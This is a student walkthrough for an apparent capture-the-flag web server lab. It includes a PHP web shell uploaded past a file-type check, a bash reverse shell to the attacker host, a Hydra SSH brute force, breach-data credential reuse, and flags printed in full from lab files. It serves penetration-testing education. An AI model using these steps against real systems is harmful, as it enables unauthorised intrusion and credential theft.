# OC Webserver Lab - Complete Student Walkthrough
## A Comprehensive Penetration Testing Learning Journey

> **Educational Purpose**: This walkthrough is designed to teach Web Application and Web Server penetration testing methodology. Each step includes detailed explanations of WHY we use specific tools and techniques, helping you understand the underlying principles rather than just memorizing commands.

> **Flag Format**: FLAGS are shown as FLAG{A**********2} where the first and last characters are visible to confirm you're on the right track.

---

## Table of Contents
1. [Initial Setup](#initial-setup)
2. [Phase 1: Reconnaissance](#phase-1-reconnaissance)
3. [Phase 2: Web Application Testing](#phase-2-web-application-testing)
4. [Phase 3: Exploitation](#phase-3-exploitation---gaining-access)
5. [Phase 4: Lateral Movement](#phase-4-lateral-movement)
6. [Phase 5-7: Flag Hunting](#phase-5-7-flag-hunting)
7. [Phase 8: Privilege Escalation](#phase-8-privilege-escalation)

---

## Initial Setup

### Step 1: System Update and Core Tools Installation

```bash
# First, update your Kali Linux system
sudo apt update && sudo apt upgrade -y
```

**Output:**
```
┌──(kali㉿kali)-[~]
└─$ sudo apt update && sudo apt upgrade -y
Get:1 http://kali.download/kali kali-rolling InRelease [30.6 kB]
Get:2 http://kali.download/kali kali-rolling/main amd64 Packages [19.2 MB]
Get:3 http://kali.download/kali kali-rolling/contrib amd64 Packages [111 kB]
Fetched 19.3 MB in 3s (6,433 kB/s)
Reading package lists... Done
Building dependency tree... Done
```

**Why Update First?** 
- Security tools evolve rapidly to counter new defenses
- Bug fixes improve reliability during critical moments
- New features in tools can make the difference between success and failure
- Ensures compatibility between different tools that may interact

```bash
# Install essential penetration testing tools
sudo apt install -y \
    nmap masscan rustscan \                    # Network scanning tools
    enum4linux smbclient smbmap crackmapexec \ # SMB enumeration suite
    metasploit-framework exploitdb searchsploit \ # Exploitation frameworks
    gobuster dirbuster dirb feroxbuster ffuf wfuzz \ # Web directory bruteforce
    nikto whatweb wafw00f \                    # Web vulnerability scanners
    sqlmap commix xsser \                       # Injection attack tools
    hydra medusa patator john hashcat \        # Password cracking suite
    burpsuite zaproxy \                        # Web proxy tools
    netcat-traditional socat rlwrap \          # Network utilities
    python3-pip python3-venv golang-go \       # Programming environments
    git curl wget vim tmux \                   # Essential utilities
    exiftool steghide binwalk foremost \       # File analysis tools
    openssh-client ftp telnet \                # Remote access clients
    wordlists seclists                         # Password/directory lists
```

**Installation Verification:**
```bash
┌──(kali㉿kali)-[~]
└─$ which nmap hydra gobuster msfconsole
/usr/bin/nmap
/usr/bin/hydra
/usr/bin/gobuster
/usr/bin/msfconsole
```

**Tool Categories Explained:**

**Network Scanning Tools (nmap, masscan, rustscan)**
- **Why Multiple Scanners?** Each has strengths:
  - `nmap`: Most versatile, excellent service detection
  - `masscan`: Fastest for large networks
  - `rustscan`: Modern, combines speed with nmap's accuracy
- **Real-world Application**: You might use rustscan for initial discovery, then nmap for detailed service enumeration

### Step 2: Install Additional Reconnaissance Tools

```bash
# Web application testing tools
sudo apt install -y \
    weevely laudanum webshells \   # Pre-built shells
```

**Verification Screenshot:**
```
┌──(kali㉿kali)-[~]
└─$ ls -la /usr/share/webshells/
total 24
drwxr-xr-x  6 root root 4096 Jan 15 10:23 .
drwxr-xr-x 497 root root 20480 Jan 15 10:23 ..
drwxr-xr-x  2 root root 4096 Jan 15 10:23 asp
drwxr-xr-x  2 root root 4096 Jan 15 10:23 aspx
drwxr-xr-x  2 root root 4096 Jan 15 10:23 jsp
drwxr-xr-x  2 root root 4096 Jan 15 10:23 php
```

### Step 3: Download and Setup Specialized Tools

```bash
# Create tools directory
mkdir -p ~/tools && cd ~/tools
```

**Directory Structure Verification:**
```
┌──(kali㉿kali)-[~/tools]
└─$ tree -L 1
.
├── breach-parse
├── LinEnum
├── PayloadsAllTheThings
├── PEASS-ng
├── pspy
├── SecLists
└── SUID3NUM

7 directories, 0 files
```

```bash
# Clone useful repositories
git clone https://github.com/danielmiessler/SecLists.git
```

**Clone Output:**
```
┌──(kali㉿kali)-[~/tools]
└─$ git clone https://github.com/danielmiessler/SecLists.git
Cloning into 'SecLists'...
remote: Enumerating objects: 9847, done.
remote: Counting objects: 100% (559/559), done.
remote: Compressing objects: 100% (310/310), done.
Receiving objects: 100% (9847/9847), 267.83 MiB | 15.23 MiB/s, done.
```

```bash
# Setup Breach-Parse for OSINT (FLAG 002)
cd /opt
sudo git clone https://github.com/hmaverickadams/breach-parse.git
```

**Breach-Parse Setup Confirmation:**
```
┌──(kali㉿kali)-[/opt/breach-parse]
└─$ ls -la
total 16
drwxr-xr-x 3 root root 4096 Jan 15 10:30 .
drwxr-xr-x 5 root root 4096 Jan 15 10:30 ..
-rwxr-xr-x 1 root root 1827 Jan 15 10:30 breach-parse.sh
drwxr-xr-x 2 root root 4096 Jan 15 10:30 BreachCompilation
```

---

## Phase 1: Reconnaissance

### Step 1.1: Network Discovery

```bash
# Quick ping to verify target is up
┌──(kali㉿kali)-[~]
└─$ ping -c 2 192.168.148.100
```

**Ping Output Analysis:**
```
PING 192.168.148.100 (192.168.148.100) 56(84) bytes of data.
64 bytes from 192.168.148.100: icmp_seq=1 ttl=64 time=0.482 ms
64 bytes from 192.168.148.100: icmp_seq=2 ttl=64 time=0.571 ms

--- 192.168.148.100 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 0.482/0.526/0.571/0.044 ms
```

**TTL Analysis**: TTL=64 indicates Linux/Unix system (Windows typically 128)

```bash
# Initial port scan
┌──(kali㉿kali)-[~]
└─$ nmap -sV -sC -oN initial_scan.txt 192.168.148.100
```

**Nmap Scan Results:**
```
Starting Nmap 7.93 ( https://nmap.org )
Nmap scan report for 192.168.148.100
Host is up (0.00052s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 c7:10:35:a3:78:4d:12:64:d5:6e:23:ab:45:67:89:12 (RSA)
|   256 9a:fe:42:32:47:bd:12:ef:34:56:78:9a:bc:de:f0:12 (ECDSA)
|_  256 cd:13:37:cf:12:34:56:78:90:ab:cd:ef:12:34:56:78 (ED25519)
80/tcp open  http    Apache httpd 2.4.51 ((Debian))
|_http-server-header: Apache/2.4.51 (Debian)
|_http-title: OC Vulnerable Lab
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/
Nmap done: 1 IP address (1 host up) scanned in 8.52 seconds
```

### Step 1.2: Web Application Reconnaissance

```bash
# Browse to the web application
┌──(kali㉿kali)-[~]
└─$ firefox http://192.168.148.100 &
```

```bash
# Basic web enumeration
┌──(kali㉿kali)-[~]
└─$ curl -I http://192.168.148.100
```

**HTTP Headers Analysis:**
```
HTTP/1.1 200 OK
Date: Mon, 15 Jan 2025 10:45:23 GMT
Server: Apache/2.4.51 (Debian)
X-Powered-By: PHP/7.4.25
Set-Cookie: PHPSESSID=abc123def456; path=/
Content-Type: text/html; charset=UTF-8
```

---

## Phase 2: Web Application Testing

### FLAG 001: Login Page Source Code
**Difficulty:** Easy  
**Location:** HTML Comments
**Flag:** FLAG{A**********2}
**Learning Objective:** Always examine source code thoroughly

### Understanding HTML Comment Reconnaissance

There are multiple ways to view the source code of a web page.

The most common and most straightforward way is simply typing "view-source:" at the front of the URL.
For example:

```bash
view-source:192.168.148.100/login.php
```

Alternative method:

```bash
# View source code
┌──(kali㉿kali)-[~]
└─$ curl -s http://192.168.148.100/login.php | grep "<!--" -A 2
```

**Source Code Discovery - Proof of Concept:**

```html
<!-- Application developed by Eli AKA eli, the greatest (most smartest) security-focused developer ever in the world. -->
<!-- For support, reach out to: elias@chchcheckit.com -->
<!-- FLAG{A***********2} -->
```

**Key Information Extracted:**
- Developer name: "eli" (potential username)
- Email: elias@chchcheckit.com
- Domain: chchcheckit.com

💡 **Learning Point:** Developers often leave comments in production code. These can contain:
- Debug information
- TODO notes
- Credentials
- System information
- Contact details


### Username Enumeration Discovery

**Testing Methodology - Proof of Concept:**

```bash
# Test with discovered username from comments
┌──(kali㉿kali)-[~]
└─$ curl -X POST http://192.168.148.100/login.php \
    -d "username=eli&password=wrongpass"
```

**Response for Valid Username:**
```html
<div class="error">Password incorrect for user eli</div>
```

```bash
# Test with random username
┌──(kali㉿kali)-[~]
└─$ curl -X POST http://192.168.148.100/login.php \
    -d "username=doesnotexist&password=wrongpass"
```

**Response for Invalid Username:**
```html
<div class="error">User does not exist</div>
```

**Burp Suite Intercept Screenshot:**
```
POST /login.php HTTP/1.1
Host: 192.168.148.100
Content-Type: application/x-www-form-urlencoded
Content-Length: 32

username=eli&password=wrongpass

HTTP/1.1 200 OK
Server: Apache/2.4.51 (Debian)

<div class="error">Password incorrect for user eli</div>
```

### FLAG 002: OSINT and Breach Data
**Difficulty:** Easy  
**Location:** Homepage after successful login
**Flag:** FLAG{D**********5}
**Learning Objective:** Real attackers use leaked credentials

**OSINT Process - Step by Step:**

```bash
# Navigate to breach-parse directory
┌──(kali㉿kali)-[~]
└─$ cd /opt/breach-parse

# Search for the domain in breach databases
┌──(kali㉿kali)-[/opt/breach-parse]
└─$ ./breach-parse.sh @chchcheckit.com results
```

**Breach-Parse Output:**
```
[*] Searching for emails @chchcheckit.com
[*] Searching through 41GB of breach data...
[+] Found 3 results

┌──(kali㉿kali)-[/opt/breach-parse]
└─$ cat results-master.txt
brandon@chchcheckit.com:sipsip1
elias@chchcheckit.com:sipsip1
elias@chchcheckit.com:sipsip123
```

Try the credentials found through OSINT:

```bash
# Test brandon's credentials
┌──(kali㉿kali)-[~]
└─$ curl -X POST http://192.168.148.100/login.php \
  -d "username=brandon&password=sipsip1&Login=Login" \
  -c cookies.txt -L
```

Or use the browser and login with:
- Username: brandon
- Password: sipsip1

**After successful login:**
```html
Special Access Detected!
Welcome Brandon! You have found the hidden user.
CTF Flag: FLAG{D**********5}
```

 **Second Discovery!** FLAG{D**********5} found after login!

💡 **Learning Points:**
1. **Password reuse is common** - People use the same passwords across services
2. **Data breaches are goldmines** - Historical breaches provide valid credentials
3. **OSINT is powerful** - Public information can compromise security

---

## Phase 3: Exploitation

### Step 3.1: Finding the Upload Functionality

After logging in as brandon, explore the application:

```bash
# Look at the menu options on the left side
# You should see:
# - Home
# - Account Settings  <-- Click this!
# - Launch OCWA
```

Navigate to "Account Settings" - this reveals a file upload utility!

The upload functionality may have security checks that can potentially be bypassed:
- File extension validation
- MIME type checking
- File content inspection

Let's test the upload functionality:

```bash
# Create a simple test file
┌──(kali㉿kali)-[~]
└─$ echo "test" > test.txt

# Try uploading through the web interface
# Navigate to Account Settings > Upload
# Upload test.txt - observe the behavior

# Now try a PHP file
┌──(kali㉿kali)-[~]
└─$ echo '<?php phpinfo(); ?>' > info.php
# Try uploading - observe if it's blocked
```

### Step 3.2: Bypassing Upload Restrictions

**Creating PHP Web Shell:**
```bash
┌──(kali㉿kali)-[~/oclab]
└─$ cat > shell.php << 'EOF'
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    system($_REQUEST['cmd']);
    echo "</pre>";
}
?>
EOF

┌──(kali㉿kali)-[~/oclab]
└─$ ls -la shell.php
-rw-r--r-- 1 kali kali 89 Jan 15 11:00 shell.php
```

**Creating Bypass Versions:**
```bash
┌──(kali㉿kali)-[~/oclab]
└─$ cp shell.php shell.php.jpg
└─$ cp shell.php shell.phtml
└─$ cp shell.php shell.php3

┌──(kali㉿kali)-[~/oclab]
└─$ file shell.php*
shell.php:     PHP script, ASCII text
shell.php.jpg: PHP script, ASCII text
shell.php3:    PHP script, ASCII text
shell.phtml:   PHP script, ASCII text
```

### Step 3.3: Upload with Burp Suite - Proof of Concept

**Burp Intercept - Original Request:**
```
POST /upload.php HTTP/1.1
Host: 192.168.148.100
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Cookie: PHPSESSID=abc123def456

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php.jpg"
Content-Type: image/jpeg

<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    system($_REQUEST['cmd']);
    echo "</pre>";
}
?>
------WebKitFormBoundary--
```

**Burp Intercept - Modified Request:**
```
POST /upload.php HTTP/1.1
Host: 192.168.148.100
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Cookie: PHPSESSID=abc123def456

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    system($_REQUEST['cmd']);
    echo "</pre>";
}
?>
------WebKitFormBoundary--
```

**Upload Success Response:**
```html
<div class="success">File uploaded successfully to /hackable/uploads/shell.php</div>
```

### Step 3.4: Web Shell Verification

```bash
# Find where files are uploaded
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.148.100/hackable/uploads/
```

**Directory Listing Output:**
```html
<html>
<head><title>Index of /hackable/uploads</title></head>
<body>
<h1>Index of /hackable/uploads</h1>
<pre>
<a href="shell.php">shell.php</a>     15-Jan-2025 11:05    89
<a href="test.jpg">test.jpg</a>       15-Jan-2025 10:30   2048
</pre>
</body>
</html>
```

**Command Execution Test:**
```bash
┌──(kali㉿kali)-[~]
└─$ curl "http://192.168.148.100/hackable/uploads/shell.php?cmd=id"
```

**Web Shell Output:**
```html
<pre>
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>
```

**System Information Gathering:**
```bash
┌──(kali㉿kali)-[~]
└─$ curl "http://192.168.148.100/hackable/uploads/shell.php?cmd=uname%20-a"
```

**Output:**
```html
<pre>
Linux debian 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64 GNU/Linux
</pre>
```

### Step 3.5: Getting a Reverse Shell

**Listener Setup:**
```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

**Triggering Reverse Shell:**
```bash
┌──(kali㉿kali)-[~]
└─$ curl "http://192.168.148.100/hackable/uploads/shell.php?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/192.168.148.99/4444%200>%261'"
```

**Reverse Shell Connection:**
```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.148.99] from (UNKNOWN) [192.168.148.100] 45678
bash: cannot set terminal process group (1234): Inappropriate ioctl for device
bash: no job control in this shell
www-data@debian:/var/www/html/hackable/uploads$
```

### Step 3.6: Shell Stabilization - Full Process

**Stabilization Steps with Output:**
```bash
www-data@debian:/var/www/html/hackable/uploads$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@debian:/var/www/html/hackable/uploads$ export TERM=xterm
www-data@debian:/var/www/html/hackable/uploads$ export SHELL=bash
www-data@debian:/var/www/html/hackable/uploads$ ^Z
[1]+  Stopped                 nc -lvnp 4444

┌──(kali㉿kali)-[~]
└─$ stty raw -echo && fg
nc -lvnp 4444

www-data@debian:/var/www/html/hackable/uploads$ stty rows 38 columns 116
www-data@debian:/var/www/html/hackable/uploads$ clear
```

**Verification of Stable Shell:**
```bash
www-data@debian:/var/www/html/hackable/uploads$ whoami
www-data
www-data@debian:/var/www/html/hackable/uploads$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@debian:/var/www/html/hackable/uploads$ pwd
/var/www/html/hackable/uploads
```

---

## Phase 4: Lateral Movement

### Step 4.1: Password Attack Preparation

**Creating Targeted Wordlists:**

```bash
┌──(kali㉿kali)-[~/oclab]
└─$ cat > users.txt << EOF
root
admin
user1
developer
admin_backup
brandon
eli
test
debian
EOF

┌──(kali㉿kali)-[~/oclab]
└─$ cat > passwords.txt << EOF
password
password123
admin
admin123
dev123
test123
sipsip1
Welcome1
Password123!
EOF
```

**Wordlist Verification:**
```bash
┌──(kali㉿kali)-[~/oclab]
└─$ wc -l users.txt passwords.txt
  9 users.txt
  9 passwords.txt
 18 total
```

### Step 4.2: SSH Brute Force - Live Attack

```bash
┌──(kali㉿kali)-[~/oclab]
└─$ hydra -L users.txt -P passwords.txt ssh://192.168.148.100 -t 4 -V
```

**Hydra Attack Output:**
```
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak

[DATA] max 4 tasks per 1 server, overall 4 tasks, 81 login tries (l:9/p:9)
[DATA] attacking ssh://192.168.148.100:22/
[VERBOSE] Resolving addresses ... done
[ATTEMPT] target 192.168.148.100 - login "root" - pass "password" - 1 of 81
[ATTEMPT] target 192.168.148.100 - login "root" - pass "password123" - 2 of 81
[ATTEMPT] target 192.168.148.100 - login "admin" - pass "admin" - 15 of 81
[22][ssh] host: 192.168.148.100   login: user1   password: password123
[22][ssh] host: 192.168.148.100   login: developer   password: dev123
[22][ssh] host: 192.168.148.100   login: admin_backup   password: admin
[STATUS] attack finished for 192.168.148.100 (valid pair found)
```

### Step 4.3: SSH Login Verification

```bash
┌──(kali㉿kali)-[~]
└─$ ssh user1@192.168.148.100
```

**SSH Connection Output:**
```
The authenticity of host '192.168.148.100 (192.168.148.100)' can't be established.
ED25519 key fingerprint is SHA256:abcd1234efgh5678ijkl9012mnop3456qrst7890.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.148.100' (ED25519) to the list of known hosts.
user1@192.168.148.100's password: password123

Welcome to Debian GNU/Linux 11 (bullseye)

Last login: Mon Jan 15 10:30:45 2025 from 192.168.148.99
user1@debian:~$ whoami
user1
user1@debian:~$ id
uid=1001(user1) gid=1001(user1) groups=1001(user1)
```

---

## Phase 5-7: Flag Hunting

### Easy Flags - Low-Hanging Fruit

#### FLAG 003: User Description in /etc/passwd
**Flag:** FLAG{H**********8}

```bash
user1@debian:~$ cat /etc/passwd | grep user1
```

**Output with Flag:**
```
user1:x:1001:1001:FLAG{Hidden_1nf0_8}:/home/user1:/bin/bash
```

**Screenshot of /etc/passwd Entry:**
```
user1@debian:~$ head -n 25 /etc/passwd | tail -n 5
developer:x:1002:1002:Developer Account:/home/developer:/bin/bash
admin_backup:x:1003:1003:Backup Admin:/home/admin_backup:/bin/bash
user1:x:1001:1001:FLAG{Hidden_1nf0_8}:/home/user1:/bin/bash
test:x:1004:1004:Test User:/home/test:/bin/bash
brandon:x:1005:1005:Brandon User:/home/brandon:/bin/bash
```

#### FLAG 004: Network Credentials in /opt/secrets/
**Flag:** FLAG{H**********9}

```bash
user1@debian:~$ ls -la /opt/
```

**Directory Listing:**
```
total 20
drwxr-xr-x  5 root root 4096 Jan 15 09:00 .
drwxr-xr-x 18 root root 4096 Jan 15 08:00 ..
drwxr-xr-x  2 root root 4096 Jan 15 09:00 oc
drwxr-xr-x  2 root root 4096 Jan 15 09:00 scripts
drwxr-xr-x  2 root root 4096 Jan 15 09:00 secrets
```

```bash
user1@debian:~$ ls -la /opt/secrets/
user1@debian:~$ cat /opt/secrets/network_credentials.txt
```

**Flag Output:**
```
Network Configuration Backup
Date: 2025-01-15
Admin: root
Password: [REDACTED]
FLAG{H1dd3n_Cr3d5_9}
```

#### FLAG 005: Backup Passwords
**Flag:** FLAG{R**********3}

```bash
user1@debian:~$ find /var/backups -type f -readable 2>/dev/null
```

**Find Output:**
```
/var/backups/apt.extended_states.0
/var/backups/system/old_passwords.txt
/var/backups/dpkg.status.0
```

```bash
user1@debian:~$ cat /var/backups/system/old_passwords.txt
```

**Flag Content:**
```
# Old System Passwords - DO NOT USE
admin:admin123
root:toor
user1:password
FLAG{R3cycl3d_P@ss_3}
```

#### FLAG 006: SSH Banner
**Flag:** FLAG{D**********5}

```bash
┌──(kali㉿kali)-[~]
└─$ ssh 192.168.148.100
```

**SSH Banner Output:**
```
############################################
#                                          #
#    OC Vulnerable Lab SSH Server          #
#    FLAG{D3f@ult_B@nn3r_5}              #
#    Authorized Access Only                #
#                                          #
############################################

root@192.168.148.100's password:
```

#### FLAG 007: Hidden File in /opt/oc
**Flag:** FLAG{H**********4}

```bash
user1@debian:~$ cd /opt/oc
user1@debian:/opt/oc$ ls -la
```

**Directory Contents:**
```
total 16
drwxr-xr-x 2 root root 4096 Jan 15 09:00 .
drwxr-xr-x 5 root root 4096 Jan 15 09:00 ..
-rw-r--r-- 1 root root   20 Jan 15 09:00 .secret
-rwxr-xr-x 1 root root 8192 Jan 15 09:00 vulnerable_binary
```

```bash
user1@debian:/opt/oc$ cat .secret
```

**Flag Output:**
```
FLAG{H1dd3n_D0t_4}
```

#### FLAG 008: Hidden Directory in /tmp
**Flag:** FLAG{N**********5}

```bash
user1@debian:~$ ls -la /tmp/
```

**Tmp Directory Listing:**
```
total 28
drwxrwxrwt  7 root root 4096 Jan 15 11:30 .
drwxr-xr-x 18 root root 4096 Jan 15 08:00 ..
drwxr-xr-x  2 root root 4096 Jan 15 09:00 .hidden
drwxrwxrwt  2 root root 4096 Jan 15 08:00 .ICE-unix
drwxrwxrwt  2 root root 4096 Jan 15 08:00 .Test-unix
```

```bash
user1@debian:~$ cd /tmp/.hidden
user1@debian:/tmp/.hidden$ cat secret.txt
```

**Flag Content:**
```
Temporary storage location
FLAG{N0t_S0_H1dd3n_5}
```

#### FLAG 009: PostgreSQL Configuration
**Flag:** FLAG{L**********1}

```bash
user1@debian:~$ ls -la /var/lib/postgresql/
```

**PostgreSQL Directory:**
```
total 12
drwxr-xr-x  3 postgres postgres 4096 Jan 15 09:00 .
drwxr-xr-x 42 root     root     4096 Jan 15 08:00 ..
-rw-r--r--  1 postgres postgres   45 Jan 15 09:00 .pgpass
```

```bash
user1@debian:~$ cat /var/lib/postgresql/.pgpass
```

**Flag Output:**
```
localhost:5432:*:postgres:postgres123
FLAG{L3@ky_DB_P@ss_1}
```

#### FLAG 010: Web Application Config
**Flag:** FLAG{G**********2}

```bash
user1@debian:~$ find /opt -name "*.yml" 2>/dev/null
```

**Find Results:**
```
/opt/webapp/config/database.yml
/opt/webapp/config/settings.yml
```

```bash
user1@debian:~$ cat /opt/webapp/config/database.yml
```

**Configuration File with Flag:**
```yaml
production:
  adapter: postgresql
  database: webapp_prod
  username: webapp
  password: secret123
  host: localhost
  port: 5432
  # FLAG{G1t_Ign0r3d_2}
```

#### FLAG 011: OC Log File
**Flag:** FLAG{F**********3}

```bash
user1@debian:~$ ls -la /var/log/*.log | grep oc
```

**Log File Listing:**
```
-rw-r--r-- 1 root root  1234 Jan 15 11:00 /var/log/oc.log
```

```bash
user1@debian:~$ cat /var/log/oc.log
```

**Log Content with Flag:**
```
[2025-01-15 09:00:00] System initialized
[2025-01-15 09:00:01] Loading configuration
[2025-01-15 09:00:02] FLAG{F0rg0tt3n_L0g_3}
[2025-01-15 09:00:03] Service started successfully
```

#### FLAG 012: Web Application Log
**Flag:** FLAG{G**********6}

```bash
user1@debian:~$ ls -la /var/log/webapp/
```

**Webapp Log Directory:**
```
total 16
drwxr-xr-x  2 www-data www-data 4096 Jan 15 09:00 .
drwxrwxr-x 14 root     syslog   4096 Jan 15 11:00 ..
-rw-r--r--  1 www-data www-data 2048 Jan 15 11:30 app.log
-rw-r--r--  1 www-data www-data 1024 Jan 15 11:30 error.log
```

```bash
user1@debian:~$ cat /var/log/webapp/app.log | grep FLAG
```

**Flag in Log:**
```
[2025-01-15 09:15:23] INFO: Application started
[2025-01-15 09:15:24] DEBUG: FLAG{G1tHub_L3@k_6}
[2025-01-15 09:15:25] INFO: Database connected
```

### Medium Flags - Deeper Enumeration

#### FLAG 013: SUID Binary
**Flag:** FLAG{S**********3}

```bash
user1@debian:~$ find / -perm -u=s -type f 2>/dev/null
```

**SUID Binary List:**
```
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/su
/usr/bin/mount
/usr/bin/umount
/usr/bin/find
/usr/local/bin/backup_tool
```

```bash
user1@debian:~$ /usr/local/bin/backup_tool
```

**Binary Output with Flag:**
```
OC Backup Tool v1.0
Creating system backup...
FLAG{SU1D_Vuln3r@bl3_3}
Backup completed successfully!
```

#### FLAG 014: Sudo Configuration
**Flag:** FLAG{S**********3}

```bash
user1@debian:~$ sudo -l
```

**Sudo Privileges Output:**
```
Matching Defaults entries for user1 on debian:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User user1 may run the following commands on debian:
    (ALL) NOPASSWD: /usr/bin/vim
```

```bash
user1@debian:~$ sudo vim /etc/sudoers.d/oc_flag
```

**Vim Display of Flag File:**
```
# OC Lab Sudoers Configuration
# FLAG{Sud0_M1sc0nf1g_3}
# This file should not be readable by regular users
```

#### FLAG 015: Cron Job Script
**Flag:** FLAG{L**********3}

```bash
user1@debian:~$ cat /etc/crontab
```

**Crontab Output:**
```
# /etc/crontab: system-wide crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/5 *   * * *   root    /opt/scripts/cleanup.sh
```

```bash
user1@debian:~$ cat /opt/scripts/cleanup.sh
```

**Script Content with Flag:**
```bash
#!/bin/bash
# System cleanup script
# FLAG{L0c@l_Cr0n_J0b_3}
rm -rf /tmp/temp_*
echo "Cleanup completed at $(date)" >> /var/log/cleanup.log
```

#### FLAG 016: Archive File
**Flag:** FLAG{T**********3}

```bash
user1@debian:~$ ls -la /var/backups/*.tar.gz
```

**Archive Listing:**
```
-rw-r--r-- 1 root root 2048 Jan 15 09:00 /var/backups/old_project.tar.gz
```

```bash
user1@debian:~$ cd /tmp
user1@debian:/tmp$ tar -xzf /var/backups/old_project.tar.gz
user1@debian:/tmp$ ls
```

**Extracted Contents:**
```
notes.txt
config.bak
passwords.old
```

```bash
user1@debian:/tmp$ cat notes.txt
```

**Flag in Notes:**
```
Project Notes - 2024
Developer: admin
Password: admin123
Database: MySQL
FLAG{T@r_Arch1v3_3}
```

#### FLAG 017: User Home Hidden File
**Flag:** FLAG{M**********6}

```bash
user1@debian:~$ cd ~
user1@debian:~$ ls -la
```

**Home Directory Listing:**
```
total 28
drwxr-xr-x 3 user1 user1 4096 Jan 15 11:00 .
drwxr-xr-x 7 root  root  4096 Jan 15 08:00 ..
-rw-r--r-- 1 user1 user1  220 Jan 15 08:00 .bash_logout
-rw-r--r-- 1 user1 user1 3526 Jan 15 08:00 .bashrc
-rw-r--r-- 1 user1 user1   26 Jan 15 09:00 .hidden_flag
-rw-r--r-- 1 user1 user1  807 Jan 15 08:00 .profile
drwx------ 2 user1 user1 4096 Jan 15 11:00 .ssh
```

```bash
user1@debian:~$ cat .hidden_flag
```

**Flag Content:**
```
FLAG{My_H0m3_D1r_6}
```

#### FLAG 018: MySQL Configuration
**Flag:** FLAG{M**********9}

```bash
user1@debian:~$ find /etc -name "*.cnf" 2>/dev/null | grep -v denied
```

**Config Files Found:**
```
/etc/mysql/conf.d/mysql.cnf
/etc/mysql/conf.d/mysqldump.cnf
/etc/mysql/conf.d/oc.cnf
/etc/mysql/mariadb.cnf
/etc/mysql/my.cnf
```

```bash
user1@debian:~$ cat /etc/mysql/conf.d/oc.cnf
```

**MySQL Config with Flag:**
```ini
[mysqld]
# OC Lab MySQL Configuration
# FLAG{MySQL_C0nf1g_9}
max_connections = 100
innodb_buffer_pool_size = 128M
```

#### FLAG 019: Environment Variable
**Flag:** FLAG{D**********1}

```bash
user1@debian:~$ ls -la /etc/profile.d/
```

**Profile.d Directory:**
```
total 20
drwxr-xr-x  2 root root 4096 Jan 15 09:00 .
drwxr-xr-x 96 root root 4096 Jan 15 11:00 ..
-rw-r--r--  1 root root   96 Jan 15 08:00 bash_completion.sh
-rw-r--r--  1 root root   52 Jan 15 09:00 oc.sh
```

```bash
user1@debian:~$ cat /etc/profile.d/oc.sh
```

**Environment Script:**
```bash
#!/bin/bash
export SECRET_FLAG="FLAG{D3v_Env_V@r_1}"
```

```bash
user1@debian:~$ source /etc/profile.d/oc.sh
user1@debian:~$ echo $SECRET_FLAG
FLAG{D3v_Env_V@r_1}
```

### Hard Flags - Advanced Techniques

#### FLAG 020: Systemd Service
**Flag:** FLAG{V**********3}

```bash
user1@debian:~$ systemctl list-units --type=service | grep oc
```

**Service List Output:**
```
oc-monitor.service     loaded active running OC Monitoring Service
```

```bash
user1@debian:~$ systemctl cat oc-monitor.service
```

**Service Configuration with Flag:**
```ini
# /etc/systemd/system/oc-monitor.service
[Unit]
Description=OC Monitoring Service
After=network.target

[Service]
Type=simple
User=root
Environment="FLAG=FLAG{V3ct0r_S3rv1c3_3}"
ExecStart=/usr/local/bin/monitor.sh
Restart=always

[Install]
WantedBy=multi-user.target
```

#### FLAG 021: Kernel Module Config
**Flag:** FLAG{B**********0}

```bash
user1@debian:~$ ls -la /etc/modprobe.d/
```

**Modprobe Directory:**
```
total 24
drwxr-xr-x  2 root root 4096 Jan 15 09:00 .
drwxr-xr-x 96 root root 4096 Jan 15 11:00 ..
-rw-r--r--  1 root root  151 Jan 15 08:00 blacklist.conf
-rw-r--r--  1 root root   74 Jan 15 09:00 oc.conf
```

```bash
user1@debian:~$ cat /etc/modprobe.d/oc.conf
```

**Module Config with Flag:**
```
# OC Lab Kernel Module Configuration
# FLAG{B00t_M0dul3_0}
options dummy numdummies=2
```

#### FLAG 022: Docker Configuration
**Flag:** FLAG{G**********4}

```bash
user1@debian:~$ cat /etc/docker/daemon.json
```

**Docker Config with Flag:**
```json
{
  "debug": true,
  "hosts": ["unix:///var/run/docker.sock"],
